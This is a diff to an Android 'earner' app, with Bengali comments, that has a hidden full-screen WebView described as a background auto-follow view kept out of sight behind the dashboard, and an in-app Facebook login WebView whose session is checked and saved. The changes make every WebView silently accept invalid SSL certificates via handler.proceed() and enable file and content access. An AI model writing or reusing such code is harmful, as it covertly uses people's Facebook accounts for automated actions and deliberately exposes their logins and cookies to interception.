@@ -1,8 +1,10 @@
 package com.earner.app;
 
 import android.annotation.SuppressLint;
+import android.app.Activity;
 import android.content.SharedPreferences;
 import android.graphics.Color;
+import android.net.http.SslError;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
@@ -12,6 +14,7 @@ import android.view.View;
 import android.view.ViewGroup;
 import android.webkit.CookieManager;
 import android.webkit.JavascriptInterface;
+import android.webkit.SslErrorHandler;
 import android.webkit.WebResourceRequest;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
@@ -21,10 +24,9 @@ import android.widget.FrameLayout;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
-import androidx.appcompat.app.AppCompatActivity;
 import org.json.JSONObject;
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends Activity {
     private WebView mainWebView;
     private WebView hiddenWebView;
     private WebView fbLoginWebView;
@@ -51,17 +53,19 @@ public class MainActivity extends AppCompatActivity {
         rootLayout.setLayoutParams(new FrameLayout.LayoutParams(
                 ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
 
-        // ১. ব্যাকগ্রাউন্ড অটো-ফলো WebView (ফুল স্ক্রিন সাইজ, ড্যাশবোর্ডের পেছনে)
+        // ১. ব্যাকগ্রাউন্ড অটো-ফলো WebView (ফুল স্ক্রিন, কিন্তু মেইন ড্যাশবোর্ডের পেছনে লুকানো)
         hiddenWebView = new WebView(this);
         setupWebView(hiddenWebView);
         hiddenWebView.setWebViewClient(new WebViewClient() {
             @Override
             public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                 String url = request.getUrl().toString();
-                if (!url.startsWith("http://") && !url.startsWith("https://")) {
-                    return true;
-                }
-                return false;
+                return !url.startsWith("http://") && !url.startsWith("https://");
+            }
+
+            @Override
+            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
+                handler.proceed(); // SSL ব্লকিং আটকাবে
             }
 
             @Override
@@ -111,11 +115,16 @@ public class MainActivity extends AppCompatActivity {
         setupWebView(mainWebView);
         mainWebView.setBackgroundColor(Color.parseColor("#0b1329"));
         mainWebView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");
-        mainWebView.setWebViewClient(new WebViewClient());
+        mainWebView.setWebViewClient(new WebViewClient() {
+            @Override
+            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
+                handler.proceed();
+            }
+        });
         rootLayout.addView(mainWebView, new FrameLayout.LayoutParams(
                 ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
 
-        // ৩. ফেসবুক লগইন পপ-আপ কনটেইনার
+        // ৩. ফেসবুক লগইন পপ-আপ
         fbLoginContainer = new LinearLayout(this);
         fbLoginContainer.setOrientation(LinearLayout.VERTICAL);
         fbLoginContainer.setBackgroundColor(Color.WHITE);
@@ -123,12 +132,12 @@ public class MainActivity extends AppCompatActivity {
 
         LinearLayout topBar = new LinearLayout(this);
         topBar.setOrientation(LinearLayout.HORIZONTAL);
-        topBar.setBackgroundColor(Color.parseColor("#1877F2"));
+        topBar.setBackgroundColor(Color.parseColor("#FF1878"));
         topBar.setPadding(15, 15, 15, 15);
         topBar.setGravity(Gravity.CENTER_VERTICAL);
 
         TextView title = new TextView(this);
-        title.setText("ফেসবুক লগইন");
+        title.setText("ফেসবুক আইডি লগইন");
         title.setTextColor(Color.WHITE);
         title.setTextSize(15);
         title.setLayoutParams(new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
@@ -154,6 +163,10 @@ public class MainActivity extends AppCompatActivity {
         fbLoginWebView = new WebView(this);
         setupWebView(fbLoginWebView);
         fbLoginWebView.setWebViewClient(new WebViewClient() {
+            @Override
+            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
+                handler.proceed();
+            }
             @Override
             public void onPageFinished(WebView view, String url) {
                 checkAndSaveLogin(false);
@@ -227,6 +240,8 @@ public class MainActivity extends AppCompatActivity {
         ws.setJavaScriptEnabled(true);
         ws.setDomStorageEnabled(true);
         ws.setDatabaseEnabled(true);
+        ws.setAllowFileAccess(true);
+        ws.setAllowContentAccess(true);
         CookieManager.getInstance().setAcceptCookie(true);
         CookieManager.getInstance().setAcceptThirdPartyCookies(wv, true);
     }
